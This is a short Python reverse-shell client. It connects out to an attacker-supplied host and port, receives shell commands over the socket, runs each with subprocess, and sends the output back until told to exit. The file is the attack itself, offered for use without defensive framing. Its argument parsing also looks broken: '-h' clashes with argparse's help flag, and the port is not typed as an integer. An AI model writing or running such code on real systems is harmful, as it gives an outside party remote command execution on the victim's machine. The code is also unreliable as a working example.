import socket
import argparse
import subprocess #spawn new processes, connect to their input/output/error pipes, and obtain their return codes.

parser = argparse.ArgumentParser(prog="server_side.py", description="initiate a connection and send a reverse shell")
parser.add_argument("-h", "--host", required=True)
parser.add_argument("-p", "--port", choices=range(1024, 65535), default=1234, required=False)
args = parser.parse_args()

SERVER_HOST = args.host #server IPv4 address
SERVER_PORT = args.port
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
message = s.recv(BUFFER_SIZE).decode()
print(f"'{message}' received from {SERVER_HOST}")

while True:
    #receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
s.close()